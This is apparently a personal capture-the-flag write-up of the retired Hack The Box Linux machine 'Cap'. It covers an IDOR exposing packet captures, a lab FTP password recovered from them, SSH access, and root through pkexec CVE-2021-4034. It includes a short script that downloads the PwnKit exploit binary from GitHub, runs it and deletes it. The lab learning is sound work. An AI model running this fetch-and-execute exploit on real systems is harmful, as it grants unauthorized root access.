---
layout: post
title: Cap
date: 2026-01-06 17:02 -0700
categories: [Hack The Box, Retired Machine]
tags: [htb,linux,ftp,SUID,pkexec]
---
# Enumeration 

Initial Nmap Service Scan - 

![Initial Nmap Service Scan](assets/markdown_images/Cap/Pasted image 20260106160647.png)

FTP anonymous login is disabled - 

![FTP anonymous login](assets/markdown_images/Cap/Pasted image 20260106160956.png)

Browsing to the webpage found on port 80 reveals a security portal that contains various interesting tabs, page appears to be some type of custom network monitoring toolkit -

![First Look at Webpage](assets/markdown_images/Cap/Pasted image 20260106160838.png)

# Initial Foothold

1. The use of the Security Snapshot feature leads to the discovery of a IDOR vulnerability allowing access to previous scans of the network.
![Webpage Tabs](assets/markdown_images/Cap/Pasted image 20260106161502.png)
2. Exploring the IDOR reveals 3 scans that contain packets, the rest are either made by me messing around with the page or other previous scans. The 3 scan IDS that are populated with content are 0, 1, and 4. I decided to start with the smaller packets and work my way up. Packet 4 contained only 13 packets which were all basic HTTP related packets. Packet 0 was my second target which contained mostly HTTP related traffic as well, except the few FTP packets which contained the credentials for the 'nathan:Buck3tH4TF0RM3!' user. Packet 1 also contained only web based traffic causing me not to dig too deep into it.

![Pcap 0 Credentials](assets/markdown_images/Cap/Pasted image 20260106162310.png)

3. With the Nathan credentials I attempted to login via SSH prior to exploring the FTP service which gave a valid login to the machine allowing for me to retrieve the user flag.

![SSH login as Nathan](assets/markdown_images/Cap/Pasted image 20260106162555.png)

# Privilege Escalation  

1. Logging into the Nathan user revealed a linpeas script which could have been left by a previous HTB user however I decided to attempt running the script to see if it had any hits. This linpeas scrip led me to the Pkexec SUID bit being set.

![linpeas discovery](assets/markdown_images/Cap/Pasted image 20260106165713.png)

2. With this I started to dig looking on GTFObins did not lead to any results. However googling the SUID bit of Pkexec led the the CVE 'CVE-2021-4034' which led me to the already built tool PwnKit found at https://github.com/ly4k/PwnKit. However looking at the SSH script reveled that his script would reach out to github to download the rest of the tool so instead I just download the PwnKit binary and uploaded that directly to the target machine. 

```
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit
chmod +x ./PwnKit || exit
(sleep 1 && rm ./PwnKit & )
./PwnKit
```

![Root user access](assets/markdown_images/Cap/Pasted image 20260106170132.png)

Disclaimer: These flags are not correct as someone on the machine was actively changing them to incorrect flags. 